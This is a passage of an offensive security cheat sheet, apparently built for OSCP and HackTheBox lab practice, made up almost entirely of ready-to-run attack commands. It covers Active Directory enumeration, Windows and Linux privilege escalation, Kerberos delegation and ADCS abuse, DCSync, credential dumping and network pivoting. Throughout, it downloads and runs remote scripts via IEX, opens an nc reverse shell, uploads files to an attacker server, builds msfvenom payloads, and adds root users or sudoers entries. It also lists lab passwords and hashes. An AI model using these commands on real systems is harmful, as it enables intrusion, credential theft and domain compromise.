wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
```
### PrivescCheck
https://github.com/itm4n/PrivescCheck
```powershell
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
```

### Snaffler
Share Folder
```powershell
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe

.\Snaffler.exe -d oscp.exam -v data
```

### LaZagne
Credential Discovery
```powershell
.\lazagne.exe all
```

### BloodHound
#### Sharphound
```powershell
# Sharphound
cd /usr/lib/bloodhound/resources/app/Collectors/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"

.\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 

# rusthound
./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' -z --adcs --ldaps

# Bloodhound-python
bloodhound-python -c all -u enox -p california -d heist.offsec -ns 192.168.171.165 --zip
```
#### neo4j
```bash
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

# AS-REP-roastable
MATCH (u:User {dontreqpreauth: true}) RETURN u

# Kerberoastable 
MATCH (u:User) WHERE u.hasspn=true RETURN u

# WinRM
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# MSSQL SQLAdmin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# description
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u

# Delegation unconstrained
MATCH (c:Computer {unconstraineddelegation:true}) return c

# ANY PATH
MATCH p = shortestPath((n)-[*1..]->(c)) WHERE n.name =~ '(?i)ここにUser名.*' AND NOT c=n RETURN p
```

#### Userlist
```bash
jq '.nodes[].label'
```

### findDelegation
```bash
# vim /etc/hosts
impacket-findDelegation htb.LOCAL/user:pass
```

### cmd
```powershell
# Users file
tree /f
Get-ChildItem -force
# hidden
dir /a

#Path
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

# File Credential
Get-Childitem -Path C:\windows.old -Include *SAM -Recurse -force -ErrorAction SilentlyContinue

findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*

where /R C:\ *.config

# savecred
cmdkey /list
runas /savecred /user:oscp\bob "COMMAND HERE"

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Powershell History
(Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Powershell Passwsord XML
$credential = Import-Clixml -Path ".\connection.xml"
$credential.GetNetworkCredential().password

$secureString = $credential.Password
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
echo $plainTextPassword

$password = '01000000d08c9d...';
$secureString = ConvertTo-SecureString $password -Force;
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))

# Eventlog
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# install Service
wmic product get name

# Port
netstat -ano
tasklist /svc /FI "PID eq 336"

# Writeable folder
icacls C:\xampp\
```

## Linux
### cmd
```bash
# Port
ss -anp

# find
find / -writable -type d 2>/dev/null
find / -iname "*admin*" 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# cron
cd /etc/crond.d
```
### linpeas
```bash
cd /usr/share/peass/linpeas
```
### pspy
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
```

## Other
### git
```
# git dump
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper 
./gitdumper.sh http://pilgrimage.htb/.git/ git

# cmd
git status
git log
git show [commit]
git reset --hard
```

# Privilege Escalation
## Windows
### PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
```powershell
cd /usr/share/windows-resources/powersploit/Privesc/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')

# AllChecks
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks

# john Password123!

# Binary Hijacking
Get-ModifiableServiceFile
## AbuseFunction
Install-ServiceBinary -Name ''

# UnquotedService
Get-UnquotedService
## AbuseFunction  
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
### SharpUp
Ghostpack
```powershell
.\SharpUp.exe audit
```
### LOLBIN
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

# Binary Hijacking
## === Modifiable Service Binaries ===
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\mysql\bin\mysqld.exe"
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
net stop mysql
shutdown /r /t 0 

# tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

## Watch
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20

#checkcmdline
IEX (iwr 'http://10.10.10.205/check_cmdline.ps1') 

# Services
# === Modifiable Services ===
sc config WindscribeService binpath="cmd /c net localgroup administrators my /add"
sc stop WindscribeService
sc start WindscribeService
```
### token
```powershell
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
cd /usr/share/windows-resources/binaries/
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.83 9999 -e cmd"

# SharpToken
cd /usr/share/windows-resources/binaries/
.\SharpToken.exe list_token
.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
.\SharpToken.exe add_user admin Abcd1234! Administrators
```
### SePriv
#### Full Power
https://github.com/itm4n/FullPowers

#### Psgetsystem
https://github.com/decoder-it/psgetsystem

#### TakeOwn
https://github.com/fashionproof/EnableAllTokenPrivs

```powershell
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown

takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
#### BackupPrivilege
https://github.com/giuliano108/SeBackupPrivilege
```powershell 
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt


# SAM SYSTEM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM
```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
```powershell
diskshadow.exe
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

#### LoadDriver
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
https://github.com/TarlogicSecurity/EoPLoadDriver/
https://github.com/musheebat/Compiled-capcom-exploit

```powershell
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
.\ExploitCapcom.exe
```
#### SeManageVolume
https://github.com/CsEnox/SeManageVolumeExploit
```bash
# Default
C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll

$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)

#DLL Hijacking
systeminfo
c:\windows\system32\wbem\tzres.dll
```

### PrintNightmare
https://github.com/calebstewart/CVE-2021-1675

### HiveNightmare
https://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6

### S4U
#### SpoolSample
https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
```powershell
 .\Rubeus.exe monitor /interval:5 /nowrap

.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator /domain:htb.local" "exit"

.\Rubeus.exe asktgt /rc4:NTLM /user:administrator /ptt /nowrap

dir \\dc01.inlanefreight.local\c$
```
#### krbrelayx
https://github.com/dirkjanm/krbrelayx
```bash
# 制約なし委任されてるUserへのGenericWriteがあればいける
## DNS
python dnstool.py -u INLANEFREIGHT.LOCAL\\genWuser -p passwd -r my.INLANEFREIGHT.LOCAL -d 10.10.14.224 --action add 10.129.205.35
# SPN registered
## vim /etc/hosts to connect to the dc01
python addspn.py -u inlanefreight.local\\genWuser -p passwd --target-type samname -t sqldev -s CIFS/my.inlanefreight.local dc01.inlanefreight.local

# recov tgt in tgs
python krbrelayx.py -s user -p 
python krbrelayx.py -s user -hashes :NTLM 

#printerBUG 
python printerbug.py inlanefreight.local/genWuer:passwd@10.129.205.35 my.inlanefreight.local

# DCsync
unset KRB5CCNAME
export KRB5CCNAME=./Administrator.ccache
impacket-secretsdump dc01.INLANEFREIGHT.LOCAL -k -no-pass -just-dc-user Administrator -just-dc-ntlm
```
#### DC-Constrained Delegation
```bash
unset KRB5CCNAME
impacket-getST -spn SRV/DC01 'INLANEFREIGHT.LOCAL/delegrate-User:pass' -impersonate Administrator -dc-ip 10.129.193.100 
export KRB5CCNAME=./Administrator.ccache

# vim /etc/hosts DC01 (SPN)
impacket-psexec -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
```

#### RBCD
https://github.com/Kevin-Robertson/Powermad
<br/>
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

##### PowerShell
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')

New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString 'Pass12345!' -AsPlainText -Force) -Verbose 
Get-DomainComputer TEST

$ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# RBCD User etc GenericWrite
$credentials2 = New-Object System.Management.Automation.PSCredential "resourced\rbcd_user", (ConvertTo-SecureString 'rbcd_pass' -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose -Credential $credentials2

.\Rubeus.exe hash /user:TEST$ /password:'Pass12345!' /domain:resourced.local
.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc01.resourced.local /ptt /nowrap /altservice:host,ldap,http,winrm,cifs

klist
ls \\msdsspn_fqdn\c$
```
##### Bash
```bash
impacket-addcomputer -computer-name 'TEST$' -computer-pass 'Pass12345!' -dc-ip 10.129.205.35 resourced.local/rbcd_user

wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip 192.168.171.175 -t DC01 -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/DC01.resourced.local resourced.local/TEST\$:'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
export KRB5CCNAME=./Administrator.ccache

# vim /etc/hosts DC01 (SPN)
impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
```

#### nopac
```powershell
cd /opt/noPac
source ./venv/bin/activate

# scan
python3 scanner.py htb.local/svc_test:testpass -dc-ip 172.16.5.5 -use-ldap

#psexec
python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync
 python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
```

### ADCS
```bash
# find service
crackmapexec ldap 172.16.117.0/24 -u  -p '' -M adcs
```

https://github.com/secure-77/Certipy-Docker
```powershell
# Cert request
## Certify.exe
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator

openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out admin.pfx

##certipy
docker build -t certipy:latest .
docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
# ntpdate dc-ip
certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
'Administrator@example.com' -debug

# TGT request
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:

certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -debug
```
#### PassTheCert
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x86/PassTheCert.exe

.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --add-computer --computer-name <Computer Name>
Get-DomainComputer authority
Get-DomainComputer <Computer Name>
.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --rbcd --target <CN=DC,OU=Domain Controllers,DC=example,DC=com> --sid <Resource-SID>

impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
```
#### PetitPotam
https://github.com/topotam/PetitPotam<br/>
https://github.com/ly4k/PetitPotam<br/>

https://github.com/dirkjanm/PKINITtools
```bash
# listener
sudo ntlmrelayx.py -debug -smb2support --target http://target.htb.local/certsrv/certfnsh.asp --adcs --template DomainController
# 強制認証
python3 PetitPotam.py kaliIP targetIP -u user -p password -d domain

# TGT request
.\Rubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /getcredentials /password:
```

### UAC bypass
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

### Group
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges

### Other Tools
https://github.com/expl0itabl3/Toolies<br/>
https://github.com/dxnboy/redteam

## Linux
### SUGGEST
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh 
```
###  /etc/passwd
```bash
joe@debian-privesc:~$ openssl passwd w00t
joe@debian-privesc:~$ openssl passwd -1 w00t
Fdzt.eqJQ4s0g
joe@debian-privesc:~$ echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### shadow
```bash
unshadow ./etc/passwd ./etc/shadow > unshadow.txt
# $y$
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt --rules /usr/share/john/rules/best64.rule unshadow
```

### sudoer
```bash
LFILE='/etc/sudoers'
echo username ALL=(ALL) NOPASSWD: ALL >> c:$LFILE 
```

### Kernel Ecpliot
```bash
# Environment
wget https://github.com/schecthellraiser606/oscp_cheet/raw/main/Dockerfile
docker build -t vuln .
docker run -v /root/work/:/work -it vuln /bin/bash
```

### Cron File backup
```bash
echo 'chmod +s /bin/bash' >root.sh
chmod +x root.sh
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=bash root.sh'
```

# Transfer
## Port Forwading
### SSH
```bash
# localport
ssh -L 4455:172.16.50.217:445 database_admin@10.4.50.215
# l Dynamic
## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
ssh -D 0.0.0.0:1080 database_admin@10.4.50.215
tail /etc/proxychains4.conf

# remote
sudo systemctl start ssh
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
# よくあるやつ
ssh -D 0.0.0.0:1080 -R 80:127.0.0.1:80 -R 1336:192.168.45.205:1336 support@192.168.228.153

# r Dynamic
ssh -R 1080 kali@192.168.118.4
tail /etc/proxychains4.conf
```
#### sshuttle
```bash
sshuttle -r database_admin@192.168.50.63:22 10.4.50.0/24 172.16.50.0/24
```
#### plink
```bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
### Chisel
https://github.com/jpillora/chisel/releases
```bash
./chisel_1.9.0_linux_amd64 server -p 2345 --reverse
.\chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445

# Dynamic
./chisel_1.9.0_linux_amd64 server -p 2345 --socks5 --reverse
./chisel_1.9.0_linux_amd64 client 192.168.49.100:2345 R:socks

#Listening fowarding
./chisel_1.9.0_linux_amd64 server -p 2345 
.\chisel.exe client 192.168.45.184:2345 1337:127.0.0.1:80

# tail /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```
### Ligolo-ng
https://github.com/nicocha30/ligolo-ng/releases
```bash
# file
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_arm64.tar.gz
tar -zxvf ligolo-ng_proxy_0.6.2_linux_arm64.tar.gz

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip

ip tuntap add user root mode tun ligolo
ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:2345

./agent -connect 192.168.45.10:2345 -ignore-cert
.\agent.exe -connect 192.168.45.10:2345 -ignore-cert

session 
session : 1
start 
ifconfig 

ip route add 172.16.0.0/16 dev ligolo
ip route delete 172.16.0.0/16 dev ligolo
ip route

# Transport Kali Web
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp
listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:80 --tcp
listener_list
```

## SMB
```bash
impacket-smbserver work /root/work -smb2support

copy  \\192.168.\test.zip
xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
```
## FTP
```bash
# get
prompt
mget *

wget -m ftp://ftp:ftp@192.168.166.114/*

# passive mode
passive

# binary mode
bin
# text
ascii

# upload folder
/var/ftp/pub/
```
# HTTP
https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```bash
#powershell
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37/upload -File 

# linux
python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.zip'
```


# Tips
## list
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```

## Metasploit
```bash
# hundler
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
use multi/handler
# sessions
sessions -l
sessions -i 1

# exploit suggest
use post/multi/recon/local_exploit_suggester

# privesc 
getsystem
migrate 

load kiwi
creds_all
lsa_dump_sam

# Port Forwading
use multi/manage/autoroute

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
jobs

# other
lcd /home/kali/Downloads
lpwd
download 
upload
```

## Empire
```bash
# first
listeners
uselistener http

usestager windows_launcher_vbs
usestager windows_cmd_exec

agents
interact
```

## RDP admin
```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v: /u:administrator /pth: /dynamic-resolution /drive:.,linux /bpp:8 /compression /audio-mode:0 -themes -wallpaper
```

## User-Name-List
https://github.com/urbanadventurer/username-anarchy
```
git clone https://github.com/urbanadventurer/username-anarchy

./username-anarchy Bill Gates > bill.txt
./username-anarchy --input-file ../full-name.txt > unames.txt
```

## sheet
https://github.com/0xsyr0/OSCP
